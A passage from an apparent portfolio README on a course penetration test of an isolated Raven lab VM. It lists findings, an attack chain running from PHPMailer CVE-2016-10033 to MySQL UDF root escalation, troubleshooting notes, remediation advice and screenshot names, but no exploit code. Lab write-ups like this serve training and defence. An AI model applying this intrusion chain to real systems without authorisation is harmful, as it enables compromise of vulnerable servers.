- **Action Performed:** Restored the Iron Raven target VM to its `CIP-A105-CTF1-CLEAN-BASELINE` snapshot.
- **Evidence Visible:** Snapshot restoration confirmation dialog for the target VM.
- **Why It Matters:** Returns the lab environment to its pre-engagement state, in full compliance with the Rules of Engagement requiring restoration after all activity concludes.
- **Skill Demonstrated:** Rules-of-engagement compliance and responsible lab management.

---

## Findings

| ID | Title | Severity | Status |
|---|---|---|---|
| F-01 | PHPMailer 5.2.16/5.2.17 Remote Code Execution (CVE-2016-10033) | **Critical** | Exploited |
| F-02 | MySQL Running as Root — UDF Privilege Escalation | **Critical** | Exploited |
| F-03 | Sensitive Credentials Stored in Plaintext (`wp-config.php`) | **High** | Confirmed |
| F-04 | WordPress User Enumeration via Login Error Messages | **Medium** | Confirmed |
| F-05 | Apache Directory Listing Enabled | **Medium** | Confirmed |
| F-06 | Outdated WordPress Installation (4.8.7) | **Medium** | Confirmed |

**Attack Chain Summary:** Directory listing (F-05) disclosed the vulnerable PHPMailer version → PHPMailer RCE (F-01) provided an initial `www-data` foothold → plaintext credentials (F-03) exposed the MySQL root password → MySQL misconfiguration (F-02) enabled privilege escalation to full root.

---

## Challenges Encountered

- **Isolated network with no internet access** initially blocked WPScan database updates, requiring a controlled, temporary, and fully documented exception to the network isolation policy.
- **Encoding errors in the standard `rockyou.txt` wordlist** caused a brute-force attack to fail after 12 minutes; resolved by cleaning the wordlist with `iconv`.
- **Metasploit exploitation attempts failed twice** due to incorrect `WEB_ROOT` and `TARGETURI` parameters, requiring careful cross-referencing against evidence (the disclosed web root path) gathered earlier in the engagement.
- **A mid-assessment VirtualBox VM crash** ("Guru Meditation" error) disrupted operations and required recovery from a clean snapshot.
- **Shared-library compilation failed** on the first attempt due to a missing `-fPIC` compiler flag, requiring diagnosis of a 64-bit relocation error before a working exploit binary could be produced.

Each of these obstacles was diagnosed, documented, and resolved methodically rather than skipped — reflecting realistic, professional troubleshooting under engagement conditions.

---

## Recommendations

**Immediate (0–48 hours)**
- Upgrade PHPMailer to the latest stable 6.x release.
- Reconfigure MySQL to run under a dedicated low-privilege service account, not root.
- Rotate the MySQL root password and create a least-privilege WordPress database user.
- Restrict or remove web access to the `/vendor/` directory.
- Disable Apache directory listing (`Options -Indexes`) across all web directories.

**Short-Term (1–4 weeks)**
- Upgrade WordPress to the current stable release.
- Deploy a WordPress security plugin to suppress username disclosure in login errors.
- Store database credentials in environment variables rather than plaintext configuration files.
- Revoke MySQL `FILE` and `SUPER` privileges from application-level database users.

**Strategic (1–3 months)**
- Implement a Web Application Firewall (WAF) with argument-injection detection signatures.
- Deploy file integrity monitoring for the web root and configuration files.
- Establish a formal patch management process for all server-side libraries.
- Enable MySQL audit logging to detect anomalous or unauthorized SQL activity.
- Conduct regular (e.g., quarterly) penetration tests against all web-facing services.

---

## Key Learning Outcomes

- Reinforced that **outdated, unpatched software** — even long after a CVE's public disclosure — remains one of the most reliable initial-access vectors in real environments.
- Demonstrated that **misconfiguration compounding** (directory listing + plaintext credentials + root-privileged database service) is frequently more impactful than any single vulnerability in isolation.
- Highlighted the importance of **methodical troubleshooting** — every failed attempt (brute force, Metasploit misconfiguration, compilation errors) was diagnosed and resolved rather than abandoned.
- Reinforced the value of **rigorous documentation and evidence handling**, including timestamped logging, SHA-256 evidence hashing, and structured operator activity records.
- Demonstrated the practical application of the **principle of least privilege** as a single control that, if enforced, would have prevented the privilege-escalation stage entirely even had initial access still been achieved.

---

## Professional Value

This project demonstrates, with verifiable evidence, that the practitioner can:

- Independently execute a **complete offensive security engagement lifecycle** — from scoping and reconnaissance through exploitation, privilege escalation, and reporting — without step-by-step guidance.
- **Read, understand, and adapt public exploit code** rather than relying solely on point-and-click tooling.
- **Diagnose and resolve real technical obstacles** (encoding errors, compiler flags, misconfigured exploit parameters, infrastructure crashes) under realistic conditions.
- Move fluidly between **network-level, web-application-level, and database-level** attack surfaces within a single engagement.
- Translate raw technical findings into a **structured, risk-rated, business-relevant report** with actionable remediation guidance — a skill directly transferable to professional penetration testing, red teaming, and security consulting roles.
- Operate within **strict rules of engagement and evidentiary discipline**, reflecting the professional standards expected in real client-facing security work.

---

## Repository Structure

```
Operation-Iron-Raven/
│
├── README.md                     # This file
├── Operation_Iron_Raven_Report.docx / .pdf   # Full formal penetration test report
│
└── Screenshots/
    ├── kali_host_only_network_ip.png
    ├── nmap_ping_scan_result.png
    ├── false_positive_ip_from_the_ping_scan.png
    ├── most_likely_scan_result_for_iron_raven.png
    ├── full_port_script_and_version_scan_on_192_168_56_103.png
    ├── gobuster_bruteforce_scan_results.png
    ├── Starting_a_new_script_and_reconfirming_the_target_reachability_and_attacker_ip.png
    ├── First_wps_scan_failed_because_of_isolated_network.png
    ├── Updated_the_wps_database_and_did_a_sweep_update_on_other_tools_to_prevent_future_delays.png
    ├── attacker_ip_returned_to_host_only_confirmed__and_no_change_in_host_only_ip_confirmed.png
    ├── running_wpscan_against_the_victim.png
    ├── wpscan_result.png
    ├── confirmed_this_is_raven_vm_from_the_content_of_the_html_homepage_on_the_victim_machine.png
    ├── Accesing_the_wordpress_folder_with_firefox_browser.png
    ├── found_flag3.png
    ├── saving_and_hashing_flag3.png
    ├── Searchploit_result_for_openssh_6_7_and__apache_2_4_10.png
    ├── wpscan_bruteforce_stopped_due_to_invalid_byte_sequence.png
    ├── cleaned_rockyou_txt_saved_in_loot_folder.png
    ├── using_the_cleaned_rockyou_txt_wordlist_from_the_loot_folder.png
    ├── wordpress_user_login_password_bruteforce_result.png
    ├── flag1_found.png
    ├── Suspecting_Vulnerable_phpmailer_installed.png
    ├── PHPmailer_version.png
    ├── found_exploit_for_PHPmailer_less_than_5_2_18_that_could_give_me_initial_access.png
    ├── Exploiting_phpmailer_via_msfconsole_and_write_payload_successful.png
    ├── available_payloads_for_the_chosen_exploit.png
    ├── chosen_exploit_for_phpmailer.png
    ├── confirming_options_before_run.png
    ├── iron_raven_crash_report.png
    ├── phpmailer_successfully_expolited_after_several_attempts.png
    ├── php_mailer_exploit_successful.png
    ├── shell_successfully_created.png
    ├── triggered_the_shell_and_got_initial_access_1.png
    ├── Flag2_found.png
    ├── found_the_credentials_for_mysql_login.png
    ├── Got_access_to_the_mysql_database.png
    ├── got_the_password_hash_for_both_worpress_users.png
    ├── priv_escal_confirmed_as_mysql_is_running_as_root.png
    ├── mysql_version_on_the_victim.png
    ├── mysql_version_and_plugin_location_on_the_victim.png
    ├── imported_exploit_to_victim.png
    ├── failed_attempt_at_compiling_the_code_on_the_victim__turns_out_it_needs_the_flag_-FPIC.png
    ├── code_successfully_compiled_on_victim.png
    ├── Got_root_after_loading_the_exploit_into_the_database.png
    ├── found_flag4.png
    ├── flag4.png
    ├── Restoring_kali_snapshot_to_clean_baseline.png
    └── Restoring_raven_snapshot_to_clean_baseline.png
```

---

## Responsible AI Use Declaration

Generative AI tooling was used to assist in **converting and formatting** the original penetration test report and its accompanying evidence into this GitHub-portfolio-style Markdown document. AI assistance was limited to structuring, formatting, and language polishing of content that was **entirely derived from the practitioner's own original report, screenshots, and documented findings**. No technical findings, evidence, commands, timestamps, vulnerabilities, exploit results, or conclusions were invented, altered, or embellished by AI; all content reflects only what was contained in the source report and screenshots.

---

## References and Acknowledgements

- **CVE-2016-10033** — PHPMailer < 5.2.18 Remote Code Execution.
- **ExploitDB #40974** — PHPMailer < 5.2.18 Remote Code Execution (Python).
- **ExploitDB #1518** — MySQL 4.x/5.0 (Linux) User-Defined Function (UDF) Dynamic Library.
- **PHPMailer Project** — github.com/PHPMailer/PHPMailer (vulnerability documentation referenced in `/vendor/README.md` and `/vendor/SECURITY.md`).
- Assessment conducted as part of an Offensive Security Operations course, under an Academy-issued Rules of Engagement, against an Academy-provided vulnerable target appliance.

---

## Disclaimer

This engagement was conducted exclusively against a designated, purpose-built training target inside a fully isolated, non-production VirtualBox lab environment, under an authorized Rules of Engagement. No production systems, third-party assets, or real user data were accessed or affected at any point. This repository is published strictly for educational and professional portfolio purposes. The techniques described must only be performed against systems you own or are explicitly authorized to test.

---

## Conclusion

Operation Iron Raven demonstrates a complete, evidence-backed offensive security engagement — from initial host discovery through full root-level compromise — executed against a realistic, vulnerable target using an industry-aligned methodology. Every stage of the attack chain relied on publicly known, well-documented vulnerabilities and misconfigurations, underscoring that disciplined reconnaissance, careful analysis, and methodical troubleshooting are often more decisive than exotic techniques. This project reflects hands-on, reproducible offensive security capability, professional-grade documentation practices, and a clear understanding of both the technical and business dimensions of penetration testing.
